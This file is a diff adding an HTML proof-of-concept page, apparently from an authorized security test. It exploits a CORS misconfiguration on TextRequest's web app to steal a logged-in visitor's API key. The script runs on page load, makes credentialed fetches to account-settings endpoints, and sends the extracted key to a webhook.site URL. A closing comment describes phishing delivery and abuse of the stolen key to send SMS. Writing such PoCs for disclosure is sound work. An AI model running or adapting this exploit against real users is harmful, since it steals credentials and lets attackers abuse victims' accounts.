@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>TextRequest CORS PoC — F-01 API Key Exfiltration</title>
+<!-- Auth: TR-AUTH-2026-0904-01 | SEC-2026-4587 | PoC only -->
+<style>
+body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
+#status { color: #4fc3f7; }
+#result { color: #ff6b6b; font-size: 1.2em; word-break: break-all; }
+.success { color: #69f0ae !important; }
+</style>
+</head>
+<body>
+<h2>TextRequest CORS Exploit — API Key Exfiltration</h2>
+<p>Auth: TR-AUTH-2026-0904-01 | SEC-2026-4587</p>
+<div id="status">Initiating CORS attack against app.textrequest.com...</div>
+<div id="result"></div>
+
+<script>
+// CORS + SameSite=None PoC
+// Confirmed: ACAO reflects any origin + credentials:true + SameSite=None cookie
+// Any authenticated TextRequest user visiting this page will leak their API key
+
+const WEBHOOK = 'https://webhook.site/73e7341b-7b9a-4be4-91b1-56910a5d7df8';
+const API_KEY_URL = 'https://app.textrequest.com/webservices/Account/RetrieveAccountAPISettings';
+const INTEGRATIONS_URL = 'https://app.textrequest.com/webservices/integrations';
+const CE_API_KEY_URL = 'https://ce.textrequest.com/webservices/Account/RetrieveAccountAPISettings';
+
+function log(msg) {
+  document.getElementById('status').textContent = msg;
+  console.log(msg);
+}
+
+function showResult(msg) {
+  const el = document.getElementById('result');
+  el.className = 'success';
+  el.textContent = '🎯 ' + msg;
+}
+
+async function exfiltrate() {
+  log('Step 1: Fetching API key with victim credentials...');
+
+  try {
+    // Primary target: app.textrequest.com
+    const r = await fetch(API_KEY_URL, {
+      method: 'GET',
+      credentials: 'include',  // Sends victim's session cookie (SameSite=None allows this)
+      mode: 'cors',
+      headers: { 'Accept': 'application/json' }
+    });
+
+    if (!r.ok) {
+      log('app.textrequest.com returned ' + r.status + ', trying ce.textrequest.com...');
+      // Fallback: Chrome Extension backend
+      const r2 = await fetch(CE_API_KEY_URL, {
+        method: 'GET',
+        credentials: 'include',
+        mode: 'cors',
+        headers: { 'Accept': 'application/json' }
+      });
+      if (r2.ok) {
+        const data = await r2.json();
+        await sendToWebhook(data, 'ce.textrequest.com');
+        return;
+      }
+      log('Both domains failed. Status: ' + r.status + '/' + r2.status);
+      return;
+    }
+
+    const data = await r.json();
+    log('Step 2: API key received! Exfiltrating...');
+    await sendToWebhook(data, 'app.textrequest.com');
+
+  } catch(e) {
+    // Try null-origin bypass (works when this page is loaded locally or in sandboxed iframe)
+    log('CORS error: ' + e.message + '. Page may need to be hosted at a real domain.');
+
+    // Try alternate endpoint: integrations
+    try {
+      const r3 = await fetch(INTEGRATIONS_URL, { credentials: 'include', mode: 'cors' });
+      if (r3.ok) {
+        const data = await r3.json();
+        await sendToWebhook(data, 'integrations');
+      }
+    } catch(e2) {
+      log('Error: ' + e2.message);
+    }
+  }
+}
+
+async function sendToWebhook(data, source) {
+  const apiKey = data?.AccountApiKey || data?.accountApiKey || data?.apiKey ||
+                 (Array.isArray(data) ? data[0]?.apiKey : null) ||
+                 JSON.stringify(data).match(/[0-9a-fA-F]{32}/)?.[0];
+
+  const payload = {
+    source: source,
+    apiKey: apiKey || 'NOT FOUND IN RESPONSE',
+    accountId: data?.AccountId || data?.accountId,
+    fullData: data,
+    timestamp: new Date().toISOString(),
+    auth: 'TR-AUTH-2026-0904-01'
+  };
+
+  showResult('API KEY: ' + (apiKey || JSON.stringify(data)));
+
+  // Send to webhook.site
+  try {
+    await fetch(WEBHOOK + '?source=' + encodeURIComponent(source) + '&key=' + encodeURIComponent(apiKey || 'none'), {
+      method: 'POST',
+      mode: 'no-cors',
+      body: JSON.stringify(payload),
+      headers: { 'Content-Type': 'application/json' }
+    });
+  } catch(e) { /* no-cors mode, ignore */ }
+
+  // Also try image beacon as fallback
+  new Image().src = WEBHOOK + '?source=' + encodeURIComponent(source) + '&apiKey=' + encodeURIComponent(apiKey || '');
+}
+
+// Auto-execute on page load
+window.addEventListener('load', exfiltrate);
+</script>
+
+<!--
+ATTACK CHAIN:
+1. Host this page at https://attacker.com/poc.html
+2. Deliver URL to authenticated TextRequest user via:
+   a) Stored link injection in SMS inbox (class="txr-message-hyperlink" + bypassSecurityTrustHtml)
+   b) Email phishing
+   c) Social media
+3. When authenticated user visits this page:
+   - fetch() with credentials:include sends their session cookie to app.textrequest.com
+   - CORS headers (ACAO=attacker.com + credentials:true) allow the response to be read
+   - SameSite=None cookie is sent cross-origin (confirmed via check-csp-cors-cookies.cjs)
+   - API key is extracted and sent to webhook.site
+4. Use API key: POST https://api.textrequest.com/api/v3/Messages
+   Headers: { "X-Api-Key": STOLEN_KEY, "Content-Type": "application/json" }
+   Body: { "AccountId": 2013, "Contact": { "PhoneNumber": "+12093093325" }, "Body": "SMS via stolen key" }
+
+VULNERABILITY CHAIN:
+- F-01: CORS Any-Origin + credentials:true (CRITICAL CVSS 9.3)
+- F-33: CORS null origin (HIGH CVSS 7.4)
+- Cookie SameSite=None (enables cross-site requests)
+- F-39: Stored link injection via Angular class bypass (delivery mechanism)
+-->
+</body>
+</html>
